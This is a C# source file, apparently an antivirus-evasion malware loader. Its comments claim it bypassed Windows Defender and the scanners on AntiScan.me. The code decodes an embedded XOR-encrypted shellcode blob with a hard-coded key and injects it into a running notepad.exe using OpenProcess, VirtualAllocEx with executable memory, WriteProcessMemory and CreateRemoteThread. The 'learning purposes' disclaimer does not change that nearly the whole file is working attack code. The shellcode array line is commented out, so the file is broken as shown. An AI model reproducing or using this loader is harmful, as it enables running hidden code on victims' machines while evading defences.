//P.S: This was tested and bypassed the Windows Defender on Windows 10 Enterprise Evaluation Version 20H2 Build 19042.1288, bypassed all the Anti-Virus Solutions on AntiScan.me as well

//This could bypass Windows Defender with the previous Details, and Inject Code in Notepad.exe this code is just for Learning Purposes
//and any abuse would be under the User's Responsibility using it 

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;


namespace XORandPROCInj
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
    processId);


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
        dwSize, uint flAllocationType, uint flProtect);



        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
    lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
    dwCreationFlags, IntPtr lpThreadId);

        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] xored = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return xored;
        }


        static void Main(string[] args)
        {
            string key = "ABCDE";
            //Add your Encrypted Shellcode using XOR on the Below line,and change the previous Line as it contains the Password, you can find the Encryption Code on the Other File called EncryptXORShellcode
           // byte[] xorshellcode = new byte[510] { 0xbd, 0x0a, 0xc0, 0xa0, 0xb5, 0xa9, 0x8e, 0x43, 0x44, 0x45, 0x00, 0x13, 0x02, 0x14, 0x17, 0x10, 0x0a, 0x72, 0x96, 0x20, 0x09, 0xc9, 0x11, 0x24, 0x13, 0x09, 0xc9, 0x11, 0x5c, 0x0d, 0xca, 0x10, 0x63, 0x09, 0x74, 0x88, 0x0a, 0x4c, 0xf3, 0x0f, 0x0b, 0x0a, 0xc8, 0x36, 0x15, 0x09, 0x73, 0x83, 0xe8, 0x79, 0x20, 0x3e, 0x41, 0x68, 0x65, 0x00, 0x83, 0x8a, 0x49, 0x04, 0x40, 0x83, 0xa1, 0xa9, 0x17, 0x09, 0xc9, 0x11, 0x64, 0x04, 0x10, 0xc9, 0x01, 0x78, 0x0d, 0x40, 0x92, 0x25, 0xc5, 0x3d, 0x59, 0x49, 0x41, 0x4b, 0xc0, 0x33, 0x42, 0x43, 0x44, 0xce, 0xc1, 0xca, 0x43, 0x44, 0x45, 0x09, 0xc7, 0x83, 0x30, 0x22, 0x09, 0x43, 0x93, 0xcf, 0x0d, 0x59, 0x06, 0xc8, 0x04, 0x65, 0x08, 0x43, 0x93, 0x14, 0xa6, 0x17, 0x0a, 0xbc, 0x8d, 0x04, 0xca, 0x76, 0xcb, 0x09, 0x74, 0x88, 0x0a, 0x42, 0x92, 0x0d, 0x70, 0x82, 0x02, 0x85, 0x8c, 0x4c, 0xee, 0x02, 0x45, 0x84, 0x79, 0xa2, 0x36, 0xb5, 0x09, 0x42, 0x0e, 0x67, 0x4c, 0x00, 0x78, 0x93, 0x36, 0x9c, 0x1d, 0x05, 0xc9, 0x03, 0x60, 0x0c, 0x40, 0x92, 0x25, 0x05, 0xce, 0x4d, 0x0a, 0x07, 0xcf, 0x05, 0x5d, 0x0b, 0x42, 0x94, 0x04, 0xca, 0x46, 0xcb, 0x05, 0x1d, 0x09, 0x43, 0x93, 0x05, 0x1d, 0x1f, 0x1b, 0x19, 0x05, 0x1d, 0x00, 0x1b, 0x02, 0x1e, 0x0d, 0xc2, 0xae, 0x63, 0x05, 0x17, 0xbe, 0xa2, 0x1b, 0x05, 0x1c, 0x1b, 0x0a, 0xc8, 0x56, 0xac, 0x0a, 0xbd, 0xbc, 0xbb, 0x18, 0x08, 0xfc, 0x34, 0x37, 0x77, 0x1e, 0x71, 0x71, 0x44, 0x45, 0x00, 0x14, 0x0a, 0xcd, 0xa3, 0x09, 0xc3, 0xaf, 0xe4, 0x44, 0x41, 0x42, 0x0a, 0xcd, 0xa0, 0x08, 0xfe, 0x41, 0x44, 0x5a, 0xd1, 0x82, 0xeb, 0x6f, 0xcd, 0x00, 0x16, 0x0a, 0xcd, 0xa1, 0x0d, 0xcb, 0xb2, 0x05, 0xff, 0x0d, 0x35, 0x65, 0x43, 0xba, 0x94, 0x0e, 0xca, 0xae, 0x2d, 0x40, 0x43, 0x43, 0x44, 0x1c, 0x00, 0xf8, 0x6a, 0xc4, 0x2e, 0x41, 0xbd, 0x96, 0x2e, 0x4f, 0x00, 0x1c, 0x13, 0x14, 0x08, 0x70, 0x8b, 0x0e, 0x75, 0x85, 0x09, 0xbd, 0x83, 0x0c, 0xcc, 0x83, 0x0a, 0xbc, 0x84, 0x0d, 0xc8, 0x83, 0x02, 0xfe, 0xaf, 0x4e, 0x9d, 0xa3, 0xbb, 0x90, 0x09, 0xcb, 0x84, 0x2e, 0x55, 0x00, 0x1a, 0x0f, 0xcd, 0xa7, 0x09, 0xcb, 0xba, 0x05, 0xff, 0xd8, 0xe7, 0x37, 0x25, 0xba, 0x94, 0xc7, 0x83, 0x30, 0x4f, 0x08, 0xbd, 0x8d, 0x31, 0xa0, 0xa9, 0xd1, 0x43, 0x44, 0x45, 0x09, 0xc1, 0xaf, 0x54, 0x0d, 0xc8, 0xa0, 0x0e, 0x75, 0x8c, 0x2b, 0x46, 0x02, 0x1c, 0x0d, 0xc8, 0xbb, 0x02, 0xfe, 0x47, 0x98, 0x8a, 0x1c, 0xbb, 0x90, 0xc2, 0xba, 0x43, 0x3a, 0x10, 0x09, 0xc1, 0x87, 0x64, 0x1b, 0xc8, 0xb4, 0x29, 0x04, 0x04, 0x18, 0x2a, 0x43, 0x54, 0x45, 0x41, 0x03, 0x1b, 0x0c, 0xcc, 0xb3, 0x0a, 0x72, 0x8d, 0x04, 0xfb, 0x1a, 0xe7, 0x17, 0xa0, 0xbe, 0x97, 0x0b, 0xcd, 0x86, 0x08, 0xcb, 0x84, 0x09, 0x74, 0x88, 0x0b, 0xca, 0xb4, 0x0d, 0xc8, 0x98, 0x0b, 0xcd, 0xbc, 0x00, 0xf8, 0x41, 0x9d, 0x8d, 0x1e, 0xbd, 0x96, 0xc7, 0xbd, 0x41, 0x3f, 0x6b, 0x1c, 0x04, 0x16, 0x1b, 0x2b, 0x44, 0x05, 0x41, 0x42, 0x02, 0x1c, 0x2f, 0x41, 0x18, 0x02, 0xfe, 0x4e, 0x6e, 0x4d, 0x73, 0xbb, 0x90, 0x16, 0x1b, 0x02, 0xfe, 0x30, 0x2f, 0x0f, 0x22, 0xbb, 0x90, 0x08, 0xbd, 0x8d, 0xad, 0x79, 0xbe, 0xbd, 0xbc, 0x0c, 0x44, 0x82, 0x0a, 0x6a, 0x82, 0x0d, 0xc4, 0xb4, 0x36, 0xf0, 0x04, 0xbe, 0xa5, 0x1b, 0x2e, 0x45, 0x18, 0x0b, 0x84, 0x86, 0xb5, 0xf4, 0xe0, 0x15, 0xbb, 0x90 };


            byte[] shellcode;
            shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));

            //OpenProcess(Read_WritePermission, Inheritence, ProcessID), GetProcessByName can be used to Automatically Get The ProcessID
		  Process[] processes = Process.GetProcessesByName("notepad");
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processes[0].Id);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
IntPtr.Zero, 0, IntPtr.Zero);


        }
    }
}
